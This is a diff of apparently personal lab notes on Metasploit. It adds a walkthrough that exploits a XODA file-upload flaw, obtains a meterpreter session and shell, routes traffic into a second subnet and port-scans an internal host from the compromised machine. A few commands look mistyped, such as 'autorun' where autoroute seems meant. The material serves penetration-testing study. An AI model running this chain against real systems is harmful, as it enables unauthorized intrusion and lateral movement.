@@ -63,18 +63,33 @@ An Auxiliary Module is a type of module within a system that includes exploits w
 - execute the module: `run`
 - downloading the webpage of the IP adress to what we can identify: `curl 192.168.20.3`
 
-**Exploiting XODA-Device (what we just curled)**
-- `search Xoda`
-- `use exploit/unix/webapp/xoda_file_upload`
-- `show options`
-- `set RHOST 192.168.20.3`
-- set Path on the Xoda device to root: `set TARGETURI /`
-- run our exploit: `exploit`
-- leave module: `back`
-
 **Run udp_sweep**
 - `search udP_sweep`
 - `run auxiliary/scanner/discovery/udp_sweep`
 - `show options`
 - `set RHOST 192.168.20.3`
 - `run`
+
+**Exploiting XODA-Service (what we just curled)**set
+- `search Xoda`
+- `use exploit/unix/webapp/xoda_file_upload`
+- `show options`
+- `set RHOSTS 192.168.20.3`
+- set Path on the Xoda device to root: `set TARGETURI /`
+- run our exploit: `exploit`
+- It did not work Problemsolving: I had to set LHOST because I have bound to a loopback address by default(127.0.0.1): `set LHOST 192.198.6.2`(my IP)
+- `exploit` run exploit again, it worked and we received a meterpreter session.
+- `sysinfo` to get Informations of the Targentmachine
+- We want to execute a Portscan on the second machine in the network:
+- `shell` open shell session
+- `/bin/bash -i` spawn a bash session to run commands easily
+- `ifconfig` to get the Target IP
+- Ctrl C to go back to meterpreter
+- `run autorun -s 192.102.202.2` set the address route and provide the subnet
+- `background` background session 1
+- `sessions` view your sessions
+- `search portscan`
+- `use 5`
+- `set RHOSTS 192.102.202.3`
+- Because we already configured the route(so that the Scan comes from the exploited machine) we can run the scan: `run`
+- leave module: `back`
